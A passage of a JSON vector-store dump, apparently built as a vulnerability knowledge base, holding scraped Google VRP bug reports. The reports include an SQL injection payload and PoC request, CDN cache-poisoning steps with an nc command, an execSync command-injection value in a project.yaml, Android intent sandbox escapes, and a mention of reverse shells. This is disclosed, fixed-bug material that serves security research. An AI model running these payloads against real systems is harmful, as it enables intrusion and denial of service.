Account.\r\nPlease, note that a user with enough permissions to create a composer environment it's also going to be able to access all those machines abusing the environment variables.\r\nIn the attachments of this report it's possible to find a video about how to user the update permission to add the environment variables inside a composer environment and get a shell inside the web server.\r\nAnd then there are 3 more videos showing shells inside the dag processor, triggerer and worker. These are reverse shells that will come by waiting and triggering some dag. At the end composer is made by python and any python execution inside any machine will execute a reverse shell.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2629, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4ccabeb3-7d4a-4665-a063-e9381968fea8": {"__data__": {"id_": "4ccabeb3-7d4a-4665-a063-e9381968fea8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_459236.txt", "file_name": "20250408_175640_459236.txt", "file_type": "text/plain", "file_size": 2661, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e271e3aa-230e-43de-9f6d-d863a8312299", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_459236.txt", "file_name": "20250408_175640_459236.txt", "file_type": "text/plain", "file_size": 2661, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7a715e804d583418e777bd3e7d8be0d6028b7861435381f2d56258941d6421c9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nSQL injection in zombo.googleprod.com via app parametar\r\nReported by:\r\nMuhammad Al-Haqbani (Shakbany)\r\nGoogle VRP\r\ntriaged\r\n22:52 | Jun 24, 2024\r\naccepted\r\n22:53 | Jun 24, 2024\r\nfixed\r\n08:06 | Jul 8, 2024\r\nreward decided\r\n$500\r\nSummary:\r\nSQL injection in zombo.googleprod.com via app parametar\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://zombo.googleprod.com/horde/login.php\r\nVulnerability type:\r\nSQL Injection (SQLi)\r\nDetails\r\nWhat is googleprod.com?\r\nGoogleprod.com appears to be a domain associated with Google's production environment. It is used internally for various services and applications. Access to this domain is typically restricted to Google's internal network and is not intended for public use.\r\nIssue detail\r\nThe app parameter appears to be vulnerable to SQL injection attacks. The payload '+(select*from(select(sleep(20)))a)+' was submitted in the app parameter. The application timed out when responding to the request, indicating that the injected SQL command caused a time delay.\r\nThe database appears to be MySQL.\r\nPoC:\r\nRequest:\r\nPOST /horde/login.php HTTP/2\r\nHost: zombo.googleprod.com\r\nCookie: Horde=7heb8ntc9c73molesaa3as6ov6; webmail-choice=roundcube; roundcube_sessid=rfblae21v5uvgnv4sroisduqif; interworx-cp=hbm1qpcotsqne7hc4ov6v13b8q\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 157\r\nOrigin: https://zombo.googleprod.com\r\nReferer: https://zombo.googleprod.com/horde/login.php\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nPriority: u=1\r\nTe: trailers\r\napp='%2b(select*from(select(sleep(20)))a)%2b'&login_post=1&url=&anchor_string=&horde_user=Username&horde_pass=Password&horde_select_view=basic&new_lang=en_US\r\nResponse:\r\nsee photo\r\nAttack scenario\r\nSQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\r\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2645, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "85c84d10-d39b-47cc-bd80-20237f208430": {"__data__": {"id_": "85c84d10-d39b-47cc-bd80-20237f208430", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_499643.txt", "file_name": "20250408_175640_499643.txt", "file_type": "text/plain", "file_size": 681, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "4bbe6897-99da-4eaa-bcf2-eaee9babb827", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_499643.txt", "file_name": "20250408_175640_499643.txt", "file_type": "text/plain", "file_size": 681, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "ba592361c714a612f710385da5e13bd88f83e9cc4f038ac0aa0de0f8ed0e2768", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://storage.googleapis.com/xoogler-payday/\r\nGoogle VRP\r\ntriaged\r\n21:23 | Jun 24, 2024\r\naccepted\r\n21:27 | Jun 24, 2024\r\nfixed\r\n08:59 | Jul 11, 2024\r\nreward decided\r\n$5,000\r\nSummary: I am able to download xoogler payslips files\r\nSteps to reproduce:\r\nClick on the page and it will show the file details\r\nappend the zip file name from the url output  to\r\nhttps://storage.googleapis.com/xoogler-payday/\r\nBrowser/OS:\r\nAttack scenario:\r\nPeople would be able to download the payslips.\r\nHowever zip file is protected by password, still I am able to download and bruteforced can be applied.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 665, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "68b5488b-4fed-4618-8b18-0cd708e9a44a": {"__data__": {"id_": "68b5488b-4fed-4618-8b18-0cd708e9a44a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_532452.txt", "file_name": "20250408_175640_532452.txt", "file_type": "text/plain", "file_size": 851, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "023d277a-eb7f-44aa-bc45-736b77eb9e8b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_532452.txt", "file_name": "20250408_175640_532452.txt", "file_type": "text/plain", "file_size": 851, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "21f677059b6745d923f43e5261a94abfe83c517dbce172b38e45b4856015cba9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in www.youtube.com\r\nReported by:\r\nShubham Deshmukh\r\nGoogle VRP\r\ntriaged\r\n20:29 | Jun 17, 2024\r\naccepted\r\n21:22 | Jun 21, 2024\r\nfixed\r\n21:20 | Jul 12, 2024\r\nreward decided\r\n$500\r\nSummary: Unauthorized Access to Chronograf InfluxDB Admin Portal on Open Port 8083 on Ip address 216.73.89.76.\r\nGoogle Drive Link:\r\nhttps://drive.google.com/drive/folders/1AdTp62KZW6dxtkVxhKRGBbGhp-ByC3sB?usp=sharing\r\nSteps to reproduce:\r\n1) Open a web browser.\r\n2) Navigate to\r\nhttp://216.73.89.76:8083/sources/1/status\r\nObserve that the admin interface is accessible without requiring login credentials.\r\nBrowser/OS: Chromium / Ubuntu 22.04\r\nAttack scenario:\r\nAny third party user can access the given affected URL via simply entering the IP and port number on the web browser.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 835, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "da2109a6-d1a4-4347-a253-b3624cb1bc2f": {"__data__": {"id_": "da2109a6-d1a4-4347-a253-b3624cb1bc2f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.txt", "file_name": "20250408_175640_562711.txt", "file_type": "text/plain", "file_size": 5076, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "16823b45-b6ef-4128-9ffa-2304de5d83e5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.txt", "file_name": "20250408_175640_562711.txt", "file_type": "text/plain", "file_size": 5076, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "db1246655b2ac9dce7fc1a57937b54f1bebaf53b0257a4a6b82904b1b10a88d2", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "769f4554-3416-4f67-a669-c20f5fb54eb2", "node_type": "1", "metadata": {}, "hash": "9e180876ab88096b062e9a0ff1934afcaf14764dedab4e853d08c37589fd636a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGoogle Cloud CDN, with the classic app LB, is vulnerable to cache poisoning when used with certain origin servers (inc. Lighttpd, Tornado, and FastHTTP) due to forwarding bare CRs after methods.\r\nReported by:\r\nBen Kallus\r\nGoogle VRP\r\ntriaged\r\n02:23 | Jun 8, 2024\r\naccepted\r\n21:29 | Jun 12, 2024\r\ntriaged\r\n01:37 | Jun 28, 2024\r\naccepted\r\n18:23 | Jul 10, 2024\r\nfixed\r\n15:40 | Aug 18, 2024\r\nreward decided\r\n$5,000\r\nSummary:\r\nGoogle Cloud CDN, with the classic app LB, is vulnerable to cache poisoning when used with certain origin servers (inc. Lighttpd, Tornado, and FastHTTP) due to forwarding bare CRs after methods.\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://cloud.google.com/cdn\r\nVulnerability type:\r\nCaching\r\nDetails\r\nThe Bug in the Classic App LB\r\nGoogle Cloud Classic Application Load Balancer accepts and forwards carriage returns (i.e.,\r\n\\r\r\n, aka \"bare CR\") in the whitespace after the HTTP method. For example, a classic application LB, upon receiving request #1, would emit something like request #2:\r\nRequest #1 (incoming to the LB)\r\nGET\\r / HTTP/1.1\\r\\n\r\nHost: whatever\\r\\n\r\n\\r\\n\r\nRequest #2 (outgoing from the LB)\r\nGET\\r / HTTP/1.1\\r\\n\r\nHost: whatever\\r\\n\r\nX-Cloud-Trace-Context: <some big number>\\r\\n\r\nVia: 1.1 google\\r\\n\r\nX-Forwarded-For: <some IPs>\\r\\n\r\nX-Forwarded-Proto: http\\r\\n\r\nConnection: Keep-Alive\\r\\n\r\nCDN-Loop: google\\r\\n\r\n\\r\\n\r\nThe HTTP RFCs are clear that this behavior is incorrect:\r\nA sender MUST NOT generate a bare CR (a CR character not immediately followed by LF) within any protocol elements other than the content. A recipient of such a bare CR MUST consider that element to be invalid or replace each bare CR with SP before processing the element or forwarding the message.\r\nIn other words, a recipient of a bare CR in this location has two choices:\r\nReplace it with a space\r\nReject the message\r\nThe classic application LB does neither, and instead forwards the bare CR as-is. Thus, for caching purposes, a method of\r\nGET\\r\r\nis equivalent to\r\nGET\r\n.\r\nMechanism For Exploiting the Bug\r\nThis bug can be used to poison the Google Cloud CDN cache when the following are true:\r\nNegative caching is enabled.\r\nThe origin server behind the CDN does not respond 400 to requestts with methods suffixed with\r\n\\r\r\n.\r\nThe origin server behind the CDN considers methods suffixed with\r\n\\r\r\nas distinct from their un-suffixed counterparts.\r\nIt turns out that there are many such HTTP servers. Here are some examples:\r\nTornado\r\nLighttpd\r\nCherryPy\r\nLibsoup\r\nLibevent\r\nHow to Exploit the Bug\r\nTo reproduce the cache poisoning attack for yourself, do the following:\r\nConfigure a Google Cloud Classic Application Load Balancer, and enable Cloud CDN with negative caching.\r\nPoint the LB at port 80 on a machine you control with a publicly-routable IP.\r\nStart an instance of Lighttpd on that machine on port 80, with the server root set to\r\n/var/www/html\r\n. (This is the server root in the default configuration file. This step should thus be as simple as\r\napt -y install lighttpd && lighttpd -f /etc/lighttpd/lighttpd.conf\r\n)\r\nMake a file called\r\nindex.html\r\nin the server root, and put some data in it:\r\necho 'Hello world!'", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3185, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "769f4554-3416-4f67-a669-c20f5fb54eb2": {"__data__": {"id_": "769f4554-3416-4f67-a669-c20f5fb54eb2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.txt", "file_name": "20250408_175640_562711.txt", "file_type": "text/plain", "file_size": 5076, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "16823b45-b6ef-4128-9ffa-2304de5d83e5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.txt", "file_name": "20250408_175640_562711.txt", "file_type": "text/plain", "file_size": 5076, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "db1246655b2ac9dce7fc1a57937b54f1bebaf53b0257a4a6b82904b1b10a88d2", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "da2109a6-d1a4-4347-a253-b3624cb1bc2f", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.txt", "file_name": "20250408_175640_562711.txt", "file_type": "text/plain", "file_size": 5076, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6fb4bafdcd93e576ffc3e65a12006f1af09e0b02b9322c92ab372fa27b4e952f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "It turns out that there are many such HTTP servers. Here are some examples:\r\nTornado\r\nLighttpd\r\nCherryPy\r\nLibsoup\r\nLibevent\r\nHow to Exploit the Bug\r\nTo reproduce the cache poisoning attack for yourself, do the following:\r\nConfigure a Google Cloud Classic Application Load Balancer, and enable Cloud CDN with negative caching.\r\nPoint the LB at port 80 on a machine you control with a publicly-routable IP.\r\nStart an instance of Lighttpd on that machine on port 80, with the server root set to\r\n/var/www/html\r\n. (This is the server root in the default configuration file. This step should thus be as simple as\r\napt -y install lighttpd && lighttpd -f /etc/lighttpd/lighttpd.conf\r\n)\r\nMake a file called\r\nindex.html\r\nin the server root, and put some data in it:\r\necho 'Hello world!' > /var/www/html/index.html\r\nSend the following request to the LB:\r\nGET /index.html HTTP/1.1\\r\\n\r\nHost: <your host name>\\r\\n\r\n\\r\\n\r\nObserve that the server responds with the content of the file:\r\nHTTP/1.1 200 OK\\r\\n\r\nContent-Type: text/html\\r\\n\r\nETag: \"1820227750\"\\r\\n\r\nLast-Modified: Thu, 06 Jun 2024 23:52:45 GMT\\r\\n\r\nContent-Length: 13\\r\\n\r\nAccept-Ranges: bytes\\r\\n\r\nDate: Fri, 07 Jun 2024 00:28:15 GMT\\r\\n\r\nServer: lighttpd/1.4.74\\r\\n\r\nVia: 1.1 google\\r\\n\r\n\\r\\n\r\nHello world!\r\nSend the following request to the LB (this should poison the cache):\r\nGET\\r /index.html HTTP/1.1\\r\\n\r\nHost: <your host name>\\r\\n\r\n\\r\\n\r\nObserve that the server responds 501, indicating that Lighttpd doesn't support the\r\nGET\\r\r\nmethod:\r\nHTTP/1.1 501 Not Implemented\\r\\n\r\nContent-Type: text/html\\r\\n\r\nContent-Length: 170\\r\\n\r\nDate: Fri, 07 Jun 2024 00:28:25 GMT\\r\\n\r\nServer: lighttpd/1.4.74\\r\\n\r\nVia: 1.1 google\\r\\n\r\n\\r\\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<meta charset=\"UTF-8\" />\r\n<title>501 Not Implemented</title>\r\n</head>\r\n<body>\r\n<h1>501 Not Implemented</h1>\r\n</body>\r\n</html>\r\nTry sending the first request again, and observe that it now also elicits a 501 response:\r\nprintf 'GET /index.html HTTP/1.1\\r\\nHost: whatever\\r\\n\\r\\n' | nc <your LB IP> <your LB port>\r\nHTTP/1.1 501 Not Implemented\\r\\n\r\nContent-Length: 170\\r\\n\r\nServer: lighttpd/1.4.74\\r\\n\r\nVia: 1.1 google\\r\\n\r\nDate: Fri, 07 Jun 2024 00:31:54 GMT\\r\\n\r\nContent-Type: text/html\\r\\n\r\nAge: 4\\r\\n\r\n\\r\\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<meta charset=\"UTF-8\" />\r\n<title>501 Not Implemented</title>\r\n</head>\r\n<body>\r\n<h1>501 Not Implemented</h1>\r\n</body>\r\n</html>\r\nThus, the cache has been poisoned.\r\nAttack scenario\r\nAn attacker can use this vulnerability to deny service to sites that use negative caching on the classic app. LB, paired with any of the servers listed earlier, such as Lighttpd.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 2408, "end_char_idx": 5060, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "3b4071f7-1281-4648-ad02-13f5deee3924": {"__data__": {"id_": "3b4071f7-1281-4648-ad02-13f5deee3924", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_660731.txt", "file_name": "20250408_175642_660731.txt", "file_type": "text/plain", "file_size": 3734, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "4d0b0ad4-f993-4b18-bbce-7d5d804d13ab", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_660731.txt", "file_name": "20250408_175642_660731.txt", "file_type": "text/plain", "file_size": 3734, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7510f7ca7f0b23bc3ae2944ecd696ec33918490e6b93780667cfedac09a86f0a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGoogle OSS-Fuzz's pr_helper.yml GitHub Actions workflow is vulnerable to a Javascript injection which allows an attacker to abuse the GITHUB_TOKEN with pull-requests: write permission.\r\nReported by:\r\nFran\u00e7ois Proulx\r\nGoogle VRP\r\ntriaged\r\n22:24 | May 14, 2024\r\naccepted\r\n17:47 | May 15, 2024\r\nfixed\r\n04:18 | May 25, 2024\r\nreward decided\r\n$500\r\nSummary:\r\nGoogle OSS-Fuzz's pr_helper.yml GitHub Actions workflow is vulnerable to a Javascript injection which allows an attacker to abuse the GITHUB_TOKEN with pull-requests: write permission.\r\nProgram:\r\nOSS VRP\r\nURL:\r\nhttps://github.com/google/oss-fuzz/blob/master/.github/workflows/pr_helper.yml\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nThe GitHub Actions workflow (\r\n.github/workflows/pr_helper.yml\r\n) of the OSS-Fuzz project (i.e.\r\nhttps://github.com/google/oss-fuzz/blob/master/.github/workflows/pr_helper.yml\r\n) is vulnerable to a Javascript injection which allows the attacker to abuse the permissions of the GITHUB_TOKEN (i.e.\r\npull-requests: write\r\n). The injection is done through the\r\nMESSAGE\r\nenvironment variable on line 57 (\r\nhttps://github.com/google/oss-fuzz/blob/master/.github/workflows/pr_helper.yml#L57\r\n) and is possible the arbitrary (unconstrained) user provided value\r\nrepo_url\r\nin the\r\nproject.yaml\r\nfile is concatenated on line 104 of the\r\ninfra/pr_helper.py\r\nPython script (\r\nhttps://github.com/google/oss-fuzz/blob/master/infra/pr_helper.py#L104\r\n).\r\nAttack scenario\r\nAn attacker forks the public repo of OSS-Fuzz\r\nhttps://github.com/google/oss-fuzz/\r\n)\r\nCreates a branch in the fork in order to open a Pull Request against the upstream which must contain:\r\nprojects/new-project-which-does-not-exist/doesnotmatter.txt\r\n(pretends to create a new project - which could be legitimate in fact)\r\nExplicitly DOES NOT put the\r\nproject.yaml\r\nat the base of that project, but instead put somewhere else in the branch (for instance at the root - or in a sub-directory of the new project). As long as the file is called\r\nproject.yaml\r\n(ex. ``projects/new-project-which-does-not-exist/whatever/project.yaml`)\r\nMalicious\r\nproject.yaml\r\nmust contain a maliciously crafted\r\nmain_repo\r\nvalue such as:\r\n\"aa'+require('child_process').execSync(atob('YmFzaCAtYyAnaWQ7ZW52Jw==')).toString()+'bb\"\r\nThe code flow of\r\npr_helper.py\r\nwill parse the PR and fall back to an alternate code path where the\r\nget_integrated_project_info()\r\nfunction will be called, loading arbitrary YAML and the value\r\nmain_repo\r\nwill be injected as raw in the string, which will be set as an environment variable\r\nMESSAGE\r\nThe env var\r\nMESSAGE\r\nwill be injected verbatim (interpolated) as Javascript, leading to Arbitrary Remote Code Execution in the context of the\r\nLeave comments\r\nstep.\r\nBecause the workflow is processing the event\r\npull_request_target\r\n, the attacker can craft a payload which has the ability to dump the memory of the GitHub Actions runner (given that the\r\nGITHUB_TOKEN\r\nis not set as en var in the context of the\r\nLeaving Comments\r\nstep.\r\nThe\r\nGITHUB_TOKEN\r\nhas a\r\npull-requests: write\r\npermission, which can allow the attacker to:\r\nAdd the\r\nReady to merge\r\nlabel\r\nDelete the original comment\r\nattacker is integrating a new project: ...\r\nReplace it with a fake comment\r\nattacker (verified) is either the primary contact or is in the CCs list of projects/openssl.\r\nGiven that the\r\npr_helper.yml\r\nworkflow only triggers on the\r\nopened\r\nevent of\r\npull_request_target\r\n, the attacker can force push on his branch, and point some change to\r\nprojects/openssl\r\n, while he is not allowed to and would not normally get\r\nReady to merge\r\nautomatically applied, but he was able to fake it.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3717, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "544bfb60-513e-46a9-84ac-6af751bd793a": {"__data__": {"id_": "544bfb60-513e-46a9-84ac-6af751bd793a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_691964.txt", "file_name": "20250408_175642_691964.txt", "file_type": "text/plain", "file_size": 1352, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5b2bfec0-7668-43f3-b767-df270b44b271", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_691964.txt", "file_name": "20250408_175642_691964.txt", "file_type": "text/plain", "file_size": 1352, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "2e44c579fd0dd4318e17c710a024341de47e3b86d17a623f1820ba06bcec4697", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nFaceviewer wrongly trusting gstatic.com\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n17:52 | May 13, 2024\r\naccepted\r\n21:06 | Jun 12, 2024\r\nfixed\r\n09:37 | Aug 22, 2024\r\nreward decided\r\n$4,500\r\nSummary:\r\nFaceviewer wrongly trusting gstatic.com\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox\r\nVulnerability type:\r\nSandbox Escape\r\nDetails\r\nCreate this link replacing <xss> with a url reflected xss of\r\n*.gstatic.com\r\n<a href=\"faceviewer://arvr.google.com/faceviewer?arbi=1&wturl=https://ssl.gstatic.com/<xss>\">tap</a>\r\nCreate a test app with a non-browsable intent for example.\r\n<intent-filter>\r\n             <action android:name=\"android.intent.action.VIEW\" />\r\n             <category android:name=\"android.intent.category.DEFAULT\" />\r\n             <data android:scheme=\"testintent\" />\r\n</intent-filter>\r\nFrom the top level gstatic page run the following.\r\nfaceViewerWebXBridge.postMessage(JSON.stringify({cmd: btoa(':\\x0F\\n\\rtestintent://')}));\r\nAttack scenario\r\nAn attacker can abuse bugs in non-web exposed android intents from the web.\r\nWhile this does need a xss on gstatic, this is not considered a security issue so (hopefully) I can assume it exists. (postMessage one does not sure about url)\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1336, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4c71deb6-3602-45f9-8387-97ee376a8c9c": {"__data__": {"id_": "4c71deb6-3602-45f9-8387-97ee376a8c9c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_755233.txt", "file_name": "20250408_175642_755233.txt", "file_type": "text/plain", "file_size": 1423, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c2a3a186-58d6-4cea-9c71-460ed5ce6531", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_755233.txt", "file_name": "20250408_175642_755233.txt", "file_type": "text/plain", "file_size": 1423, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "9285a4dcdbabfd9a52927d431d7f73985bdf2cda34b31a340a50a6f9a78033b9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nIntent redirect in Google Play Store app\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n17:45 | May 8, 2024\r\naccepted\r\n01:06 | May 30, 2024\r\nfixed\r\n06:45 | Aug 7, 2024\r\naccepted\r\n15:01 | Sep 24, 2024\r\nfixed\r\n21:39 | Oct 18, 2024\r\nreward decided\r\n$4,500\r\nSummary:\r\nBypass to issue 40060327 via market:// URL\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nmarket://details?id=com.sec.android.app.sbrowser&url=https%3A%2F%2Fexample.org\r\nVulnerability type:\r\nSandbox Escape\r\nDetails\r\nThis is a chromium security issue tracked as\r\nhttps://issues.chromium.org/338398037\r\nThey asked me to file a bug here, its very similar to the fixed\r\nhttps://issues.chromium.org/40064598\r\nI recommend adding [REDACTED_EMAIL] for context.\r\nInstall Samsung browser\r\nPut the following html on a Android device\r\n<a href=\"market://details?id=com.sec.android.app.sbrowser&url=https%3A%2F%2Fexample.org\">tap</a>\r\nTap that link\r\nNotice it opened the Samsung browser via chrome to an attacker chosen URL without prompting the user first bypassing the protections of\r\nhttps://issues.chromium.org/40060327\r\nAttack scenario\r\nGoogle Play bypasses the patch from\r\nhttps://issues.chromium.org/40060327\r\nas\r\nThis intent URI causes the link to be opened in the Samsung browser (com.sec.android.app.sbrowser) application instead. This occurs without any notification to or consent from the 